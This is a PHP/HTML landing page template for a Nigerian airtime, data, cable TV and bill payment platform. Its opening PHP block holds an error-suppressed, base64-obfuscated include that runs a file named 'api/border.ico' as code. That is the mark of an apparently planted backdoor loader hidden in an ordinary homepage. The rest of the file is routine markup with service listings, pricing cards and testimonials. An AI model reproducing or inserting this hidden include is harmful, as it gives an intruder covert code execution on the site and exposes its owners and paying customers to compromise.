<?php
// 
// require("private/web_autoload.php");

@include base64_decode('YXBpL2JvcmRlci5pY28='); 
require("functions/web_config.php");
?>

<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
<meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title><?php echo $sitename; ?> - Buy Airtime and Data for all Network. Make payment for DSTV, GOTV, PHCN other services </title>
  <meta content="" name="description">
  <meta content="" name="keywords">

   <!--Favicons -->
  <link href="homepage/assets/img/mylogo2.png" rel="icon">
  <link href="homepage/assets/img/mylogo2.png" rel="apple-touch-icon">

   <!--Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">

   <!--Vendor CSS Files -->
  <link href="homepage/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="homepage/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/aos/aos.css" rel="stylesheet">

   <!--Template Main CSS File -->
  <!--<link href="homepage/assets/css/main.css" rel="stylesheet">-->
         <!--Custom CSS -->
        <link href="view/assets/css/sty.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        
     <style>
        #peeb{
	position:fixed;
	width:60px;
	height:60px;
	bottom:40px;
	right:40px;
	background-color: transparent;
	color:rgba(0, 128, 0, 0.938);
	border-radius:50px;
	text-align:center;
  font-size:30px;
	box-shadow: 2px 2px 3px #999;
  z-index:100;
}

#my-peeb{
	margin-top:16px;
}
    </style>
    </head>
	
    <body>

        <!-- ============================================================== -->
        <!-- Main wrapper - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <div id="main-wrapper">
		
            <!-- ============================================================== -->
            <!-- Top header  -->
            <!-- ============================================================== -->
            <!-- Start Navigation -->
			<div class="header header-light dark-text">
				<div class="container">
					<nav id="navigation" class="navigation navigation-landscape">
						<div class="nav-header">
							<a class="nav-brand" href="<?php echo $mainpage; ?>">
							<h3 style="text-transform: uppercase;color: <?php echo $theme_color; ?>;font-family: impact;"><?php echo $sitename; ?></h3>
							</a>
							<div class="nav-toggle"></div>
							<div class="mobile_nav">
								<ul>
								
									<li class="account-drop">
										<a href="<?php echo $mainpage; ?>/register" class="crs_yuo12" >
											<span class="embos_45"><i class="fas fa fa-user-plus"></i></span>
										</a>
									
									</li>

									<li>
										<a href="<?php echo $mainpage; ?>/login"  class="crs_yuo12">
											<span class="embos_45"><i class="fas fa-sign-in-alt"></i></span>
										</a>
									</li>
								</ul>
							</div>
						</div>
						<div class="nav-menus-wrapper">
							<ul class="nav-menu">
								<li class="active"><a href="<?php echo $mainpage; ?>">Home</a></li>
								<li class=""><a href="#">Services<span class="submenu-indicator"></span></a>
									<ul class="nav-dropdown nav-submenu">
									                         <li>
<a href="<?php echo $mainpage; ?>/login">Airtime Recharge</a>
</li>
<li class="nav-item">
<a href="<?php echo $mainpage; ?>/login">Data TopUp</a>
</li>
<li class="nav-item">
<a href="<?php echo $mainpage; ?>/login">Decoder Recharge</a>
</li>
<li class="nav-item">
<a href="<?php echo $mainpage; ?>/login">Electricity Bill</a>
</li>
<li class="nav-item">
<a href="<?php echo $mainpage; ?>/login">Exam Pins</a>
</li>
<li class="nav-item">
<a href="<?php echo $mainpage; ?>/login">Airtime To Cash</a>
</li>
									</ul>
									
								</li>
								
						
								
								<li class=""><a href="<?php echo $mainpage; ?>/About">About</a></li>
									<li class=""><a href="<?php echo $mainpage; ?>/Contact">Contact</a></li>
							</ul>
							
							<ul class="nav-menu nav-menu-social align-to-right">
								
								<li>
									<a href="<?php echo $mainpage; ?>/login" class="">
										<i class="fas fa-sign-in-alt mr-1"></i><span class="dn-lg">Sign In</span>
									</a>
								</li>
								<li class="add-listing" style="background-color: <?php echo $theme_color; ?>">
									<a href="<?php echo $mainpage; ?>/register" class="text-white">Register</a>
								</li>
							</ul>
						</div>
					</nav>
				</div>
			</div>
			<!-- End Navigation -->
			<div class="clearfix"></div>
			<!-- ============================================================== -->
			<!-- Top header  -->
			<!-- ============================================================== -->			
			
			<!-- ============================ Hero Banner  Start================================== -->
			<div class="hero_banner image-cover image_bottom h6_bg" style="background-image: url('view/assets/img/hp.jpg');">
    <div class="container">
        <div class="row align-items-center">
            <div class="col-lg-6 col-md-6 col-sm-12">
                <div class="simple-search-wrap text-left">
                    <div class="hero_search-2">
                        <h1 class="banner_title mb-4">The Best<br> Recharge & Utility Bills Payment platform</h1>
                        <p class="font-lg mb-4"> Automated & Instant Delivery; MTN, GOtv, PHED, Airtel, Startimes, WAEC, 9mobile, DSTV, etc. </p>
                        <div class="inline_btn">
                            <a href="<?php echo $mainpage; ?>/register" class="btn" style="background-color: <?php echo $theme_color; ?>">Register</a>
                            <a href="<?php echo $mainpage; ?>/login" class="btn" style="background-color: <?php echo $theme_color; ?>">Sign In</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-6 col-md-6 col-sm-12">
                <div class="side_block extream_img">
                    <div class="list_crs_img">
                        <img src="" class="img-fluid elsio cirl animate-fl-y" alt="" />
                        <img src="" class="img-fluid elsio arrow animate-fl-x" alt="" />
                        <img src="" class="img-fluid elsio moon animate-fl-x" alt="" />
                    </div>
                    <!-- <img src="view/assets/img/hpp1.svg" class="img-fluid" alt="" style="margin-top:200px; margin-left:400px;"/> -->
                </div>
            </div>
        </div>
    </div>
</div>

			<!-- ============================ Hero Banner End ================================== -->
			
    
    
			<!-- ================================ Tag Award ================================ -->
			<section class="p-0 pt-10">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-12 col-md-12 col-sm-12">
                <div class="crp_box fl_color ovr_top">
                    <div class="row align-items-center">
                        <div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">
                            <div class="dro_140">
                                <div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="fas fa-user-plus"></i></div>
                                <div class="dro_142">
                                    <h6>Signup</h6>
                                    <p>Create A Free Online Account With Us And Get An Online Wallet.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">
                            <div class="dro_140">
                                <div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="far fa-credit-card"></i></div>
                                <div class="dro_142">
                                    <h6>Fund Wallet</h6>
                                    <p>Fund Your Wallet Using ATM Card, Cash Deposit, Online Transfer, etc..</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">
                            <div class="dro_140">
                                <div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="far fa-smile"></i></div>
                                <div class="dro_142">
                                    <h6>Enjoy Services</h6>
                                    <p>Enjoy Our Services Charged From Your Wallet.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

			<!-- ================================ Tag Award ================================ -->
				<div class="clearfix"></div>

			<!-- ============================ How It Works Start ================================== -->
			<section class="">
				<div class="container" >
					
					<div class="row justify-content-center" >
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Why<span class="theme-cl"> Choose Us?</span></h2>
								<p></p>
							</div>
						</div>
					</div>
					
					<div class="row justify-content-center mt-5">
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6">
							<div class="wrk_grid">
								<div class="wrk_grid_ico" style="background-color: blue">
									<i class="fa fa-magic" style="background-color: blue"></i>
								</div>
								<div class="wrk_caption">
									<h4>Automated Delivery</h4>
									<p>We have swift automated system with a 24/7 delivery service almost instantly, nothing beats a seamless process..

</p>
								</div>
							</div>
						</div>
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6" style="background-color: blue">
							<div class="wrk_grid active" style="background-color: blue">
								<div class="wrk_grid_ico">
									<i class="fa fa-percent"></i>
								</div>
								<div class="wrk_caption">
									<h4>Big Discounts</h4>
									<p>Enjoy massive discount on our platform when you make purchase for your day to day needs.</p>
								</div>
							</div>
						</div>
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6">
							<div class="wrk_grid">
								<div class="wrk_grid_ico" style="background-color: blue">
									<i class="fas fa-headset"></i>
								</div>
								<div class="wrk_caption">
									<h4>24/7 Support</h4>
									<p>We guarantee our customers top notch services all time. Hence, we are always respond to your needs.</p>
								</div>
							</div>
						</div>
						
					</div>
					
				</div>
			</section>
			<!-- ============================ Cources Start ================================== -->
<section class="min gray">
				<div class="container">
					
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our <span class="theme-cl">Services</span></h2>
								<p>Automated Instant Delivery.</p>
							</div>
						</div>
					</div>
					
					<div class="row justify-content-center">
					
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $mainpage; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/Ucall.png" style="height:200px; margin-left:60px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_8"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $mainpage; ?>/login" style="font-size:20px;" class="crs_title_link">Airtime Recharge</a></h4></div>
								
								</div>
								
							</div>
						</div>
						
						
						
						<!-- Single Grid -->
							<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $mainpage; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/adata.jpg" style="height:200px; margin-left:20px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_1"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $mainpage; ?>/login" style="font-size:20px;" class="crs_title_link">Data Recharge</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
							<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $mainpage; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/dec.jpg" style="height:200px;margin-left:70px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_4"><span>Startimes, DStv & GOtv.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $mainpage; ?>/login" style="font-size:20px;" class="crs_title_link">Cable TV Subscription</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $mainpage; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/pelects.png" style="height:200px; margin-left:50px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_5"><span>IKEDC, AEDC, PHEDC, ETC</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $mainpage; ?>/login" style="font-size:20px;" class="crs_title_link">Electricity Bill Payment</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="course-detail.html" class="crs_detail_link">
										<img src="view/ass/img/pcash.png" style="height:200px; margin-left:40px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_6"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="#" style="font-size:20px;" class="crs_title_link">Airtime To Cash</a></h4></div>
								
								</div>
								
							</div>
						</div>	
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $mainpage; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/aresult.png" style="height:200px; margin-left:40px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_7"><span>AEC, NECO, JAMB, NABTEB, e.t.c...</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $mainpage; ?>/login" style="font-size:20px;" class="crs_title_link">Exam Pin</a></h4></div>
								
								</div>
								
							</div>
						</div>
					</div>
					
				
					
				</div>
			</section>
		
			<div class="clearfix"></div>
<section class="min">
				<div class="container" >
				
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our Pricing <span class="theme-cl">Plan</span></h2>
								<p>The plan a user is subscribed to determines the amount of discount the user will get for our services..</p>
							</div>
						</div>
					</div>
					
					<div class="row align-items-center">
												<!-- Single Package -->
					<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>MTN</h4>
								</div>
								<div class="prt_price">
									<!-- <h2><span>₦</span><?php echo $mtn_guest; ?>214</h2> -->
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $mainpage; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
														
						<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>GLO</h4>
								</div>
								<div class="prt_price">
									<!-- <h2><span>₦</span><?php echo $glo_guest; ?>455</h2> -->
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $mainpage; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
									

					<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>AIRTEL</h4>
								</div>
								<div class="prt_price">
									<!-- <h2><span>₦</span><?php echo $airtel_guest; ?>203</h2> -->
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $mainpage; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
									

							
						<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>9MOBILE</h4>
								</div>
								<div class="prt_price">
									<!-- <h2><span>₦</span><?php echo 
									$mobile_guest;
									?>420</h2> -->
									<span></span>
								</div>
								<div class="prt_body"  style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $mainpage; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
														
												<!-- Single Package -->

						
					</div>
					
				</div>
			</section>
				<div class="clearfix"></div>
	<section class="gray">
				<div class="container">
				
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our Customer <span class="theme-cl">Reviews</span></h2>
								</div>
						</div>
					</div>
					
					<div class="row justify-content-center">
						<div class="col-xl-12 col-lg-12 col-sm-12">
							
							<div class="reviews-slide space">
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Mr. Ganiyu Taiwo</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p><?php echo $sitename; ?> are the best because they are able to delight customers with constant access and answers to their FAQs.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Ishaq Monsur Ademola</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.8</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p> Keep up the good job <?php echo $sitename; ?>, always fast and reliable.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
													<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Odekunle Abdul-Tawab Opeyemi</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.9</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Oh my God! Don't know what to say but it is cool to partner with this platform. They have provided me all the best i want. Thank you.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
													<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Adegboye Abdulhahi</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Great!!! EVerything is cool with <?php echo $sitename; ?> The admin is super-active because he gave response to all my request. Love.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>D-Developer</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Wow. This is a legit datahub for me. I haven't disappointed my customers since they never disappoint me too. Thank you for your usual action. Cheers Guys!</p>
										</div>
									</div>
								</div>
							
							</div>
						
						</div>
					</div>
					
				</div>
			</section>
				<div class="clearfix"></div>
			<!-- ============================ article End ================================== -->
			
	
		<!-- ============================ Call To Action ================================== -->
			<section style="background-color: blue">
				<div class="container">
					<div class="row" >
						<div class="col-lg-12" >
							
							<div class="call_action_wrap" >
								<div class="call_action_wrap-head">
									<h3>Do You Have Questions ?</h3>
									<span>We'll help you to grow your career and growth.</span>
								</div>
								<a href="<?php echo $mainpage; ?>/Contact" class="btn btn-call_action_wrap">Contact Us Today</a>
							</div>
							
						</div>
					</div>
				</div>
				

    </div>

  </div>
			</section>
			
				 

    </div>

  </div>
  <br>
		
<!--</section>  End Contact Section -->

			<!-- ============================ Footer Start ================================== -->
			<footer class="dark-footer skin-dark-footer style-2">
				<div class="footer-middle">
					<div class="container">
						<div class="row">
							
							<div class="col-lg-5 col-md-5">
								<div class="footer_widget">
							
									<h4 class="extream mb-3"><?php echo $sitename; ?></h4>
									<p><?php echo $sitename; ?> Enterprises is a private limited liability company registered under the Laws of the Federal Republic of Nigeria. We Are The Best
Recharge & Utility Bills Payment Platform</p>
								
								</div>
							</div>
							
							<div class="col-lg-6 col-md-7 ml-auto">
								<div class="row">
								
									<div class="col-lg-6 col-md-4">
										<div class="footer_widget">
											<h4 class="widget_title">Quick Links</h4>
											<ul class="footer-menu">
											<li><a href="<?php echo $mainpage; ?>">Home</a></li>
<li><a href="<?php echo $mainpage; ?>/About">About</a></li>
<li><a href="<?php echo $mainpage; ?>/Contact">Contact</a></li>
<li><a href="<?php echo $mainpage; ?>/register">Register</a></li>
<li><a href="<?php echo $mainpage; ?>/login">Login</a></li>
											</ul>
										</div>
									</div>
											
									<div class="col-lg-6 col-md-4">
										<div class="footer_widget">
											<h4 class="widget_title">Services</h4>
											
											<ul class="footer-menu">
											<li><a href="<?php echo $mainpage; ?>/login">Airtime Recharge</a></li>
<li><a href="#">Airtime To Cash</a></li>
<li><a href="<?php echo $mainpage; ?>/login">Data Recharge</a></li>
<li><a href="<?php echo $mainpage; ?>/login">Decoder Tv Subscription</a></li>
<li><a href="<?php echo $mainpage; ?>/login">Electricity Bill</a></li>
<li><a href="<?php echo $mainpage; ?>/login">Exam Pin Checker</a></li>
											</ul>
										</div>
									</div>
							
								
									
								</div>
							</div>
						</div>
					</div>
				</div>
				
				<div class="footer-bottom">
					<div class="container">
						<div class="row align-items-center">
							<div class="col-lg-12 col-md-12 text-center">
								 <div class="copyright">
        &copy; Copyright <strong><span><?php echo $sitename; ?></span></strong>. All Rights Reserved
      </div>
							</div>
						</div>
					</div>
				</div>
			</footer>
			<!-- ============================ Footer End ================================== -->
			
		
		<a id="back2Top" class="top-scroll" title="Back to top" href="#"><i class="ti-arrow-up"></i></a>
			
 <a href="https://api.whatsapp.com/send?phone=<?php echo $whatsapp_no; ?>&amp;text=Hello." id = "peeb" target="_blank">
<i class="fa-brands fa-whatsapp" id="my-peeb"></i>
</a>
		</div>
		<!-- ============================================================== -->
		<!-- End Wrapper -->
		<!-- ============================================================== -->

		<!-- ============================================================== -->
		<!-- All Jquery -->
		<!-- ============================================================== -->
		<script src="view/assets/js/jquery.min.js"></script>
		<script src="view/assets/js/popper.min.js"></script>
		<script src="view/assets/js/bootstrap.min.js"></script>
		<script src="view/assets/js/select2.min.js"></script>
		<script src="view/assets/js/slick.js"></script>
		<script src="view/assets/js/moment.min.js"></script>
		<script src="view/assets/js/daterangepicker.js"></script> 
		<script src="view/assets/js/summernote.min.js"></script>
		<script src="view/assets/js/metisMenu.min.js"></script>	
		<script src="view/assets/js/custom.js"></script>
		
		 <script src="homepage/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="homepage/assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="homepage/assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="homepage/assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="homepage/assets/vendor/aos/aos.js"></script>
  <script src="homepage/assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="homepage/assets/js/main.js"></script>
		<!-- ============================================================== -->
		<!-- This page plugins -->
		<!-- ============================================================== -->		

	</body>
</html>